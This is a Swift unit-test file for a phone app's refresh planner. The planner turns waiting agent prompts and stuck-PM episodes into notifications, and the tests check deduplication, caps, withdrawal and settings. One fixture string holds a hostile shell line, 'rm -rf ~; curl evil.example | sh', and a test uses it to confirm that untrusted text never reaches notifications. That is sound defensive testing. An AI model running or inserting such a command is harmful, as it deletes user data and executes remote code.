import CapstanKit
import Foundation
import XCTest
@testable import CapstanPhoneCore

final class RefreshPlannerTests: XCTestCase {
    private let hostId = UUID(uuidString: "A1A1A1A1-0000-4000-8000-000000000001")!
    private let hostile = "SECRET rm -rf ~; curl evil.example | sh"

    private func text(_ raw: String) -> String {
        let escaped = raw.replacingOccurrences(of: "\\", with: "\\\\").replacingOccurrences(of: "\"", with: "\\\"")
        return "{\"raw\":\"\(escaped)\",\"verified\":true,\"truncated\":false}"
    }

    private func waiting(_ key: String, kind: String, since: String = "2026-10-29T08:00:00Z") -> String {
        "\"\(key)\":{\"key\":\"\(key)\",\"requestId\":\"req-\(key)\",\"kind\":\"\(kind)\",\"since\":\"\(since)\","
            + "\"summary\":\(text(hostile)),\"contentHash\":\"aaaaaaaaaaaa\",\"needsTerminal\":false}"
    }

    private func runJSON(stuck episode: String?, alert: Bool = true) -> String {
        let stuck = episode.map {
            "{\"episodeId\":\"\($0)\",\"reason\":\"unread_mail\",\"since\":\"2026-10-29T09:00:00Z\",\"alert\":\(alert)}"
        } ?? "null"
        return "{\"requestId\":\"run\",\"state\":\"active\",\"paused\":false,\"contentHash\":\"h\","
            + "\"pm\":{\"agentId\":\"pm-1\",\"waitingOn\":[],\"fromUser\":null,\"stuck\":\(stuck)}}"
    }

    private func project(
        _ id: String, availability: String = "ready", complete: Bool = true, waiting: [String], run: String = "null"
    ) -> String {
        "\"\(id)\":{\"projectId\":\"\(id)\",\"root\":\"/work/\(id)\",\"availability\":\"\(availability)\",\"epoch\":\"e1\","
            + "\"head\":4,\"waiting\":{\(waiting.joined(separator: ","))},\"agents\":{},\"plans\":{},\"run\":\(run),"
            + "\"details\":{},\"attention\":{},\"snapshotComplete\":\(complete),\"staleSince\":null}"
    }

    private func model(_ projects: [String]) throws -> HostModel {
        let json = "{\"hostId\":\"\(hostId.uuidString)\",\"hello\":null,\"projects\":{\(projects.joined(separator: ","))},"
            + "\"cursor\":null,\"forwards\":{}}"
        return try JSONDecoder().decode(HostModel.self, from: Data(json.utf8))
    }

    func testFirstPassIsTheBaseline() throws {
        let m = try model([project("alpha", waiting: [waiting("w1", kind: "op"), waiting("w2", kind: "prompt")])])
        let pass = RefreshPlanner.pass(models: [m], seen: nil, settings: PhoneSettings())
        XCTAssertTrue(pass.notifications.isEmpty, "nothing is announced the first time")
        XCTAssertEqual(pass.seen.count, 2)
    }

    func testOnlyNewItemsAreAnnouncedOnce() throws {
        let before = try model([project("alpha", waiting: [waiting("w1", kind: "op")])])
        let first = RefreshPlanner.pass(models: [before], seen: nil, settings: PhoneSettings())
        let after = try model([project("alpha", waiting: [waiting("w1", kind: "op"), waiting("w2", kind: "prompt")])])
        let second = RefreshPlanner.pass(models: [after], seen: first.seen, settings: PhoneSettings())
        XCTAssertEqual(second.notifications.count, 1)
        XCTAssertEqual(second.notifications.first?.title, "Permission prompt waiting")
        XCTAssertEqual(second.notifications.first?.body, "alpha")
        let third = RefreshPlanner.pass(models: [after], seen: second.seen, settings: PhoneSettings())
        XCTAssertTrue(third.notifications.isEmpty, "deduplicated by request id")
    }

    func testHostileTextNeverInANotification() throws {
        let m = try model([project("alpha", waiting: [waiting("w1", kind: "op"), waiting("w2", kind: "message")])])
        let pass = RefreshPlanner.pass(models: [m], seen: [], settings: PhoneSettings())
        XCTAssertEqual(pass.notifications.count, 2)
        for plan in pass.notifications {
            let all = [plan.title, plan.body, plan.identifier, plan.category, plan.threadIdentifier, plan.deepLink ?? ""]
            for field in all {
                for secret in ["SECRET", "rm -rf", "curl", "evil"] {
                    XCTAssertFalse(field.contains(secret), "\(secret) in \(field)")
                }
            }
        }
    }

    func testKindsSwitchedOffAndProjectsNotReadyAreLeftOut() throws {
        var settings = PhoneSettings()
        settings.notifyKinds = [.prompt]
        let m = try model([
            project("alpha", waiting: [waiting("w1", kind: "op"), waiting("w2", kind: "prompt")]),
            project("beta", availability: "silent", waiting: [waiting("w3", kind: "prompt")]),
        ])
        let pass = RefreshPlanner.pass(models: [m], seen: [], settings: settings)
        XCTAssertEqual(pass.notifications.map(\.title), ["Permission prompt waiting"])
        XCTAssertFalse(pass.seen.contains { $0.contains("beta") }, "a silent project is not remembered either")
    }

    func testCapAndOrder() throws {
        let items = (0..<12).map { waiting("w\($0)", kind: "op", since: String(format: "2026-10-29T08:%02d:00Z", 59 - $0)) }
        let pass = RefreshPlanner.pass(models: [try model([project("alpha", waiting: items)])], seen: [], settings: PhoneSettings())
        XCTAssertEqual(pass.notifications.count, RefreshPlanner.notificationCap)
        XCTAssertTrue(pass.notifications.first?.identifier.hasSuffix(".w11") ?? false, "oldest first")
        XCTAssertEqual(pass.seen.count, 12, "every item is remembered, announced or not")
    }

    func testBudgetAndCompleteness() throws {
        let start = Date(timeIntervalSince1970: 0)
        XCTAssertFalse(RefreshPlanner.shouldStop(started: start, now: start.addingTimeInterval(24), complete: false))
        XCTAssertTrue(RefreshPlanner.shouldStop(started: start, now: start.addingTimeInterval(25), complete: false))
        XCTAssertTrue(RefreshPlanner.shouldStop(started: start, now: start.addingTimeInterval(1), complete: true))
        XCTAssertFalse(RefreshPlanner.isComplete(nil))
        XCTAssertTrue(RefreshPlanner.isComplete(try model([project("a", waiting: []), project("b", availability: "gone", complete: false, waiting: [])])))
        XCTAssertFalse(RefreshPlanner.isComplete(try model([project("a", complete: false, waiting: [])])))
    }

    func testHostsSkipDisabledAndBlocked() throws {
        func config(_ id: UUID, enabled: Bool) throws -> HostConfig {
            try JSONDecoder().decode(HostConfig.self, from: Data(
                ("{\"id\":\"\(id.uuidString)\",\"displayName\":\"h\",\"destination\":\"capstan-x\",\"cstanPath\":\"cstan\","
                    + "\"extraRoots\":[],\"pollMs\":2000,\"identityFile\":null,\"enabled\":\(enabled)}").utf8))
        }
        let a = UUID(), b = UUID(), c = UUID()
        let hosts = [try config(a, enabled: true), try config(b, enabled: false), try config(c, enabled: true)]
        XCTAssertEqual(RefreshPlanner.hosts(hosts, blocked: [c]), [a])
    }

    func testSeenStoreRoundTrip() throws {
        let directory = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        defer { try? FileManager.default.removeItem(at: directory) }
        let store = SeenStore(directory: directory)
        XCTAssertNil(store.read())
        try store.write(["a", "b"])
        XCTAssertEqual(store.read(), ["a", "b"])
    }

    func testThePlannerHasNoGateAndNoDecider() throws {
        // The rule of the plan: a refresh never asks for Face ID and never decides. The source names neither type.
        let file = URL(fileURLWithPath: #filePath)
            .deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
            .appendingPathComponent("Sources/CapstanPhoneCore/Refresh/RefreshPlanner.swift")
        let source = try String(contentsOf: file, encoding: .utf8)
        let code = source.split(separator: "\n").filter { !$0.trimmingCharacters(in: .whitespaces).hasPrefix("///") }
            .joined(separator: "\n")
        XCTAssertFalse(code.contains("BiometricGate"))
        XCTAssertFalse(code.contains("Decider"))
    }

    // MARK: Stuck PM

    private func stuckModel(_ episode: String?, alert: Bool = true, availability: String = "ready", complete: Bool = true) throws
        -> HostModel
    {
        try model([
            project(
                "alpha", availability: availability, complete: complete, waiting: [],
                run: runJSON(stuck: episode, alert: alert))
        ])
    }

    func testStuckBaselinePassIsSilent() throws {
        let pass = RefreshPlanner.pass(models: [try stuckModel("ep1")], seen: nil, settings: PhoneSettings())
        XCTAssertTrue(pass.notifications.isEmpty)
        XCTAssertTrue(pass.withdraw.isEmpty)
        XCTAssertEqual(pass.seen, ["pmstuck/\(hostId.uuidString)/alpha/ep1"])
    }

    func testANewEpisodeIsAnnouncedOnceAcrossPassesAndRelaunch() throws {
        let base = RefreshPlanner.pass(models: [try stuckModel(nil)], seen: nil, settings: PhoneSettings())
        let first = RefreshPlanner.pass(models: [try stuckModel("ep1")], seen: base.seen, settings: PhoneSettings())
        XCTAssertEqual(first.notifications.count, 1)
        let plan = try XCTUnwrap(first.notifications.first)
        XCTAssertEqual(plan.title, "PM looks stuck")
        XCTAssertEqual(plan.body, "alpha")
        XCTAssertEqual(plan.category, "pm.stuck")
        XCTAssertEqual(plan.identifier, "pmstuck.\(hostId.uuidString).alpha.ep1")
        // The seen set goes through the store, as a relaunch does.
        let directory = FileManager.default.temporaryDirectory.appendingPathComponent("seen-" + UUID().uuidString)
        defer { try? FileManager.default.removeItem(at: directory) }
        let store = SeenStore(directory: directory)
        try store.write(first.seen)
        let second = RefreshPlanner.pass(models: [try stuckModel("ep1")], seen: store.read(), settings: PhoneSettings())
        XCTAssertTrue(second.notifications.isEmpty)
        XCTAssertTrue(second.withdraw.isEmpty)
    }

    func testAnEndedEpisodeIsWithdrawn() throws {
        let open = RefreshPlanner.pass(models: [try stuckModel("ep1")], seen: [], settings: PhoneSettings())
        let ended = RefreshPlanner.pass(models: [try stuckModel(nil)], seen: open.seen, settings: PhoneSettings())
        XCTAssertEqual(ended.withdraw, ["pmstuck.\(hostId.uuidString).alpha.ep1"])
        XCTAssertTrue(ended.seen.isEmpty)
        let later = RefreshPlanner.pass(models: [try stuckModel(nil)], seen: ended.seen, settings: PhoneSettings())
        XCTAssertTrue(later.withdraw.isEmpty, "withdrawn once")
    }

    func testAnEpisodeOfAHostNotReadInThisPassIsNotWithdrawn() throws {
        let other = "pmstuck/B2B2B2B2-0000-4000-8000-000000000002/alpha/ep9"
        let pass = RefreshPlanner.pass(models: [try stuckModel(nil)], seen: [other], settings: PhoneSettings())
        XCTAssertTrue(pass.withdraw.isEmpty)
    }

    func testAProjectThatCannotBeReadKeepsItsEpisode() throws {
        let key = "pmstuck/\(hostId.uuidString)/alpha/ep1"
        for (availability, complete) in [("silent", true), ("ready", false)] {
            let pass = RefreshPlanner.pass(
                models: [try stuckModel(nil, availability: availability, complete: complete)], seen: [key],
                settings: PhoneSettings())
            XCTAssertTrue(pass.withdraw.isEmpty, availability)
            XCTAssertTrue(pass.seen.contains(key), availability)
        }
    }

    func testAnEpisodeWithoutAlertIsNeverAnnounced() throws {
        let pass = RefreshPlanner.pass(models: [try stuckModel("ep1", alert: false)], seen: [], settings: PhoneSettings())
        XCTAssertTrue(pass.notifications.isEmpty)
        XCTAssertTrue(pass.seen.isEmpty)
    }

    func testStuckPlansCountInTheCap() throws {
        var items: [String] = []
        for number in 0..<RefreshPlanner.notificationCap { items.append(waiting("w\(number)", kind: "op")) }
        let m = try model([project("alpha", waiting: items, run: runJSON(stuck: "ep1"))])
        let pass = RefreshPlanner.pass(models: [m], seen: [], settings: PhoneSettings())
        XCTAssertEqual(pass.notifications.count, RefreshPlanner.notificationCap)
    }
}
